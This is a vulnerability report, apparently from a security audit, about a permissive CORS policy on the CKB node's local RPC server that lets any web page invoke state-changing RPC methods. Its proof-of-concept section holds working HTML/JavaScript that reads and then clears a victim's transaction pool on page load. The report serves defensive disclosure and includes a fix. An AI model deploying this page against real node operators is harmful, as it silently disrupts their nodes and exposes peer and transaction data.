### Title
Permissive CORS Policy on RPC HTTP Server Enables Cross-Origin State-Modifying Requests — (`File: rpc/src/server.rs`)

### Summary
The CKB RPC HTTP server unconditionally applies `CorsLayer::permissive()`, setting `Access-Control-Allow-Origin: *` on every response. This allows any web page — including a malicious one — to issue cross-origin `fetch()` requests to the node's local RPC endpoint and read the responses. A node operator who visits an attacker-controlled page while running a CKB node is silently exposed to state-modifying RPC calls (`clear_tx_pool`, `remove_transaction`, `clear_tx_verify_queue`, `set_ban`, `set_network_active`, etc.) and full information disclosure of the node's internal state.

### Finding Description
In `rpc/src/server.rs`, the axum `Router` for both the HTTP and WebSocket servers is built with a single unconditional middleware layer:

```rust
.layer(CorsLayer::permissive())
```

`tower_http::cors::CorsLayer::permissive()` emits the following response headers on every request, including preflight `OPTIONS` requests:

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: *
```

Because the wildcard origin is returned for preflight requests, browsers lift the same-origin restriction and allow any cross-origin page to:
1. Send a `POST` with `Content-Type: application/json` to `http://127.0.0.1:8114`.
2. Read the full JSON-RPC response body.

No authentication, token, or secret is required. The RPC server has no CSRF protection layer of any kind.

The following default-enabled (`Pool` and `Net` modules are on by default) state-modifying methods are directly reachable:

| Method | Effect |
|---|---|
| `clear_tx_pool` | Drops all pending transactions from the pool |
| `remove_transaction` | Removes a specific transaction and its descendants |
| `clear_tx_verify_queue` | Drops all transactions awaiting verification |
| `set_ban` | Bans a peer address |
| `clear_banned_addresses` | Removes all bans |
| `set_network_active` | Disables/enables P2P networking |
| `add_node` / `remove_node` | Manipulates peer connections |

Read-only but sensitive methods also become cross-origin readable: `get_peers`, `local_node_info`, `get_raw_tx_pool`, `get_banned_addresses`. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) 

### Impact Explanation
An unprivileged attacker who can lure a CKB node operator to visit a malicious web page can, without any user interaction beyond the page load:

- **Integrity**: Silently drain the operator's entire pending transaction pool (`clear_tx_pool`), causing all unconfirmed transactions to be dropped and requiring resubmission. Targeted removal of specific transactions (`remove_transaction`) is also possible if the attacker first reads the pool via `get_raw_tx_pool`.
- **Availability**: Disable P2P networking (`set_network_active: false`), isolating the node from the network.
- **Confidentiality**: Read the full peer list, pending transaction set, and node identity — information useful for targeted network-level attacks.

The node operator's browser acts as the unwitting HTTP client, carrying the request to `127.0.0.1:8114` with the operator's local network privileges. No credentials are needed because the RPC has no authentication.

**Impact: 4** — State-modifying actions on the tx-pool and network layer are achievable with zero clicks after page load.

### Likelihood Explanation
- The default `listen_address` is `127.0.0.1:8114`, so the attack requires the operator to visit the malicious page on the same machine running the node — a realistic scenario for desktop/laptop node operators.
- The attack requires no special knowledge beyond the default port (publicly documented).
- The malicious page needs only a few lines of JavaScript (`fetch` with a JSON body); no browser exploit or plugin is required.
- The CORS preflight succeeds unconditionally because `CorsLayer::permissive()` is hardcoded with no configuration option to restrict it.

**Likelihood: 3** — Realistic for any operator who browses the web on the same machine as their node.

### Recommendation
Replace the unconditional `CorsLayer::permissive()` with a restrictive policy. At minimum:

1. **Default to no cross-origin access**: Use `CorsLayer::new()` (deny all) as the default.
2. **Opt-in allowlist**: Expose a `rpc.allowed_origins` configuration option (e.g., `["https://trusted-dapp.example.com"]`) and build the `CorsLayer` from that list.
3. **Never allow `*` for state-modifying endpoints**: If a wildcard is needed for read-only methods, split the router and apply the permissive layer only to a read-only sub-router.

```rust
// Example: restrictive default
let cors = CorsLayer::new()
    .allow_origin(config.allowed_origins)   // user-configured allowlist
    .allow_methods([Method::POST, Method::OPTIONS])
    .allow_headers([header::CONTENT_TYPE]);
``` [5](#0-4) [6](#0-5) 

### Proof of Concept
The following page, served from any origin, silently clears the victim's transaction pool when loaded in a browser on the same machine as the CKB node:

```html
<!DOCTYPE html>
<html>
<body>
<script>
// Step 1: Read the pending pool to identify target transactions (optional)
fetch("http://127.0.0.1:8114", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({id:1, jsonrpc:"2.0", method:"get_raw_tx_pool", params:[true]})
})
.then(r => r.json())
.then(pool => {
  console.log("Pending txs:", pool.result);

  // Step 2: Clear the entire pool — no user interaction required
  return fetch("http://127.0.0.1:8114", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({id:2, jsonrpc:"2.0", method:"clear_tx_pool", params:[]})
  });
})
.then(r => r.json())
.then(res => console.log("Pool cleared:", res));
</script>
</body>
</html>
```

The browser sends an `OPTIONS` preflight to `http://127.0.0.1:8114`; the node responds with `Access-Control-Allow-Origin: *`; the browser proceeds with the `POST`; the pool is cleared. The victim sees nothing. [7](#0-6) [8](#0-7)

### Citations

**File:** rpc/src/server.rs (L110-129)
```rust
        // HTTP and WS server.
        let post_router = post(handle_jsonrpc::<Option<Session>>);
        let get_router = if enable_websocket {
            get(handle_jsonrpc_ws::<Option<Session>>)
        } else {
            get(get_error_handler)
        };
        let method_router = post_router.merge(get_router);

        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/module/pool.rs (L322-323)
```rust
    #[rpc(name = "clear_tx_pool")]
    fn clear_tx_pool(&self) -> Result<()>;
```

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/Cargo.toml (L54-54)
```text
tower-http = { workspace = true, features = ["timeout", "cors"] }
```

**File:** resource/ckb.toml (L177-198)
```text
[rpc]
# By default RPC only binds to localhost, thus it only allows accessing from the same machine.
#
# Allowing arbitrary machines to access the JSON-RPC port is dangerous and strongly discouraged.
# Please strictly limit the access to only trusted machines.
listen_address = "127.0.0.1:8114" # {{
# _ => listen_address = "127.0.0.1:{rpc_port}"
# }}

# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760

# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}

# By default RPC only binds to HTTP service, you can bind it to TCP and WebSocket.
# tcp_listen_address = "127.0.0.1:18114"
# ws_listen_address = "127.0.0.1:28114"
reject_ill_transactions = true
```
